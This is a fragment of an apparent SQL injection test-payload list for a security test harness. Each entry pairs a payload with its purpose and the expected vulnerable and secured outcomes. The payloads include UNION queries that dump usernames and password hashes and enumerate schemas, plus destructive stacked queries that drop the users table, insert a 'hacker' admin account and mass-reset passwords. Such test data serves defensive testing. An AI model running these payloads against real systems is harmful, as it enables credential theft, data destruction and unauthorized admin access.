  {"id": 12, "payload": "' UNION SELECT 1,2,3--",                         "type": "union",    "what": "Column-count enumeration — finds how many columns the SELECT returns",  "expected_vulnerable": "Values 1,2,3 appear in response body", "expected_secured": "UNION rejected or no reflection"},
  {"id": 13, "payload": "' UNION SELECT NULL,NULL,NULL--",                "type": "union",    "what": "Null-based UNION probe — safer than literal values",                   "expected_vulnerable": "NULL row appended to result", "expected_secured": "Error or empty"},
  {"id": 14, "payload": "' UNION SELECT username,password,3 FROM users--","type": "union",    "what": "Direct credential dump if column count matches",                       "expected_vulnerable": "Username+hash in HTTP response body", "expected_secured": "UNION blocked or columns mismatch"},
  {"id": 15, "payload": "' UNION SELECT table_name,2,3 FROM information_schema.tables--", "type": "union", "what": "MySQL schema enumeration — lists all table names",       "expected_vulnerable": "Table names appear in response", "expected_secured": "information_schema access denied"},
  {"id": 16, "payload": "' UNION SELECT name,sql,3 FROM sqlite_master--", "type": "union",    "what": "SQLite-specific schema dump — table names + CREATE statements",         "expected_vulnerable": "CREATE TABLE statements in response", "expected_secured": "sqlite_master access denied"},
  {"id": 17, "payload": "'; DROP TABLE users--",                          "type": "stacked",  "what": "Destructive stacked query — permanently removes users table",           "expected_vulnerable": "500 error on next login (table gone)", "expected_secured": "Stacked queries disabled, table intact"},
  {"id": 18, "payload": "'; INSERT INTO users VALUES('hacker','hacked','admin')--", "type": "stacked", "what": "Inject new admin user into the database",            "expected_vulnerable": "hacker/hacked now works as admin login", "expected_secured": "INSERT blocked"},
  {"id": 19, "payload": "'; UPDATE users SET password='hacked' WHERE '1'='1'--", "type": "stacked", "what": "Mass-reset all passwords to 'hacked'",                     "expected_vulnerable": "All passwords now 'hacked'", "expected_secured": "UPDATE blocked"},
